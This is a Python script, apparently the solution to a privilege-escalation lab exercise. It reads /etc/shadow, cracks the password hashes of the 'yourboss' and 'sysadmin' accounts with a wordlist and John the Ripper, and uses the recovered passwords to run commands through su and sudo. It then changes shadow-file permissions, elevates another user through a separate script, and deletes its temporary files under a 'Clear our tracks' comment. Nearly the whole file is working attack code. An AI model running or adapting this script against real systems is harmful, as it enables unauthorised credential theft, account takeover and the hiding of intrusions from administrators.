#!/usr/bin/env python3
# -*- coding: utf-8 -*-


import crypt
import io
import os
import pexpect
import subprocess
import time


def crack_password(pwd_entry):
	""" Returns the cracked password denoted by the given shadow file entry. """
	pwd_entry = pwd_entry.split('$')

	salt = '$' + pwd_entry[1] + '$' + pwd_entry[2] + '$'
	pwd_hash = pwd_entry[3][0:pwd_entry[3].find(':')]

	with open('/usr/share/dict/american-english-small', 'r') as words:
		for line in words.read().split('\n'):
			if crypt.crypt(line, salt) == (salt + pwd_hash):
				return line

	# Something went wrong
	return ''


def exec_cmd_as_user(user, password, command):
	""" Executes the given command as user elevated using sudo. """
	spawned = pexpect.spawn('su %s -c "echo %s | sudo -S %s"' % (user, password, command))
	ret_status = spawned.expect([pexpect.TIMEOUT, 'assword:'], timeout=60*30) # Catch both 'password:' and 'Password:', timeout at 30min (overkill)

	if ret_status == 0:
		return "Error: Process timed out"

	else:
                spawned.sendline(password)
                return spawned.read().decode('utf-8')


def exec_john_cmd_as_user(user, password, command, delay=True):
        """ Executes the given john command (adding a conditional pause to allow 
        for calculation) as user elevated using sudo. 
        """
        spawned = pexpect.spawn('su %s -c "echo %s | sudo -S %s"' % (user, password, command))
        ret_status = spawned.expect('assword:') # Catch both 'password:' and 'Password:'
        spawned.sendline(password)
        if delay:
            time.sleep(60*2)
        return spawned.read().decode('utf-8')


# We already know tempuser's password
temp_password = "correctbatteryhorsestaple99"


# Parse the shadow password file
with io.open('/etc/shadow', 'r', encoding='utf8') as shadow:
	for line in shadow.read().split('\n'):
		if line[0:8] == 'sysadmin':
			sysadmin_shadow = line
		if line[0:8] == 'yourboss':
			yourboss_shadow = line


# Crack the boss' password using custom method
yourboss_cracked = crack_password(yourboss_shadow)
print(yourboss_cracked)


# Crack the admin's password using custom method as a john backup
sysadmin_cracked_backup = crack_password(sysadmin_shadow)


# Crack the admin's password using john
# First, reformat the shadow entry
sysadmin_shadow = sysadmin_shadow.split('$')
sysadmin = sysadmin_shadow[0]
sysadmin_salt = '$' + sysadmin_shadow[1] + '$' + sysadmin_shadow[2] + '$'
sysadmin_hash = sysadmin_shadow[3][0:sysadmin_shadow[3].find(':')]

# Write formatted hash to a file
with open('temp_hash.txt', 'w') as temp_hash:
    temp_hash.write(sysadmin_salt + sysadmin_hash)

# Use john to crack the password
try:
    exec_john_cmd_as_user('yourboss', yourboss_cracked, 'john --wordlist=/usr/share/dict/american-english-small temp_hash.txt', delay=True)
    john_dump = exec_cmd_as_user('yourboss', yourboss_cracked, 'john --show temp_hash.txt')

    # Clean up john's output
    john_dump = john_dump.replace(':', '', 1).replace('\n', '', 1)
    sysadmin_cracked = john_dump[john_dump.find(':') + 1:john_dump.find('\n')]

    # TODO: Determine if john.pot exists and if so, remove it

except:
    # Something broke with john, default to the backup
    sysadmin_cracked = sysadmin_cracked_backup

# Verify we got the correct password from john
if sysadmin_cracked != sysadmin_cracked_backup:
    # Something broke with john, default to the backup
    sysadmin_cracked = sysadmin_cracked_backup

print(sysadmin_cracked)


# Fix permissions
exec_cmd_as_user('yourboss', yourboss_cracked, 'chmod u=rw,g=r,o= /etc/shadow')

# Elevate tempworker
elevate_process = subprocess.Popen(('./elevate_tempworker.sh ' + yourboss_cracked).split(), shell=False)
elevate_process.kill()


# Clear our tracks
os.remove('temp_hash.txt')
os.remove('/tmp/passwd_copy')
os.remove('/tmp/shadow_copy')

